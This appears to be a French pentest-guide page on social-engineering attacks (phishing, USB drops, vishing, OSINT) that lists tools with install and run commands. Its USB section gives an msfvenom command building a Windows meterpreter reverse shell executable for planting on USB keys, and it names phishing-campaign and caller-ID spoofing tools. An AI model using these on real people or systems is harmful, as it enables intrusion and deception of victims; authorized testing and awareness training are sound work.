# Couche 8 – Ingénierie Sociale

## 1. Types d’attaques d’ingénierie sociale

- **Phishing**  
  Le plus courant : tromper la cible pour obtenir des identifiants ou lui faire télécharger un malware, via des emails, des sites web contrefaits, etc.

- **USB Drop**  
  Déposer des clés USB infectées sur le lieu de travail pour pousser quelqu’un à les brancher.

- **Vishing/Spear phishing**  
  Ingénierie sociale par téléphone, ou campagne ciblée très personnalisée.

- **Collecte d’information (OSINT)**  
  Rassembler un maximum de données sur la cible pour préparer une attaque plus crédible.

---

## 2. Outils et méthodes

### ⚡ Attaque : Phishing

#### Outil : **SET (Social Engineering Toolkit)**
- **Description** : Générateur d’attaques d’ingénierie sociale très complet (emails, sites de phishing, payloads…).
- **Pourquoi l’utiliser** :  
  - Scénarios automatisés, prise en main rapide
- **Installation** :  
  - `sudo apt install set` ou `git clone https://github.com/trustedsec/social-engineer-toolkit.git`
- **Commande** :  
  - `sudo setoolkit`
- **Utilisation** : Menu interactif pour choisir le type de phishing.

#### Outil : **Gophish**
- **Description** : Plateforme open-source pour des campagnes de phishing à grande échelle.
- **Installation** :  
  - Voir [getgophish.com](https://getgophish.com/)
- **Commande** :  
  - `./gophish`

---

### ⚡ Attaque : USB Drop

#### Outil : **Metasploit**
- **Description** : Générer des payloads pour infecter des clés USB (ex : reverse shell, meterpreter…).
- **Installation** :  
  - `sudo apt install metasploit-framework`
- **Commandes** :  
  - Générer un payload Windows :  
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o shell.exe`
  - Copier `shell.exe` sur la clé USB.
- **Note** : Pour test sur un environnement isolé uniquement !

---

### ⚡ Attaque : Vishing

#### Outil : **SpoofCard / SpoofTel** (services payants, usage légal strict)
- **Description** : Permet de falsifier l’identifiant de l’appelant lors d’une attaque par téléphone.

#### Outil : **Twilio (API)**
- **Description** : Pour automatiser des appels/SMS dans le cadre de tests autorisés.

---

### ⚡ Attaque : OSINT

#### Outil : **theHarvester**
- **Description** : Collecte emails, sous-domaines, noms sur diverses sources publiques.
- **Installation** :  
  - `sudo apt install theharvester`
- **Commande** :  
  - `theharvester -d [domaine cible] -b google,bing,linkedin`

#### Outil : **Maltego**
- **Description** : Cartographie graphique de données (relations, emails, noms…)
- **Installation** :  
  - Sur [maltego.com](https://www.maltego.com/)

---

## 3. Contribution

> Expliquez chaque scénario d’attaque sociale, détaillez les outils et partagez des astuces pour la sensibilisation.
